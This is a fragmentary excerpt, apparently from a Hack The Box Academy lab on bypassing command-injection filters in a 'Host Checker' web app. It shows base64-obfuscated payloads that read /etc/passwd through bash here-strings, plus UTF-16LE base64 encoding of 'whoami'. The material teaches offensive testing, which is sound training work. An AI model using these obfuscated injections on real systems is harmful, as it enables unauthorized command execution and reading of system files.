...
![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing 'Invalid input' as a result.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_3.jpg)
...
![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1 with user 'www-data'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_4.jpg)
...
![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1 with user 'www-data'.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_5.jpg)
...
```shell-session
xF1NN@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
...
```shell-session
xF1NN@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
...
![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt using base64 decoding. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1 with user 'www-data' and additional user information.](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_commands_6.jpg)
...
```shell-session
xF1NN@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
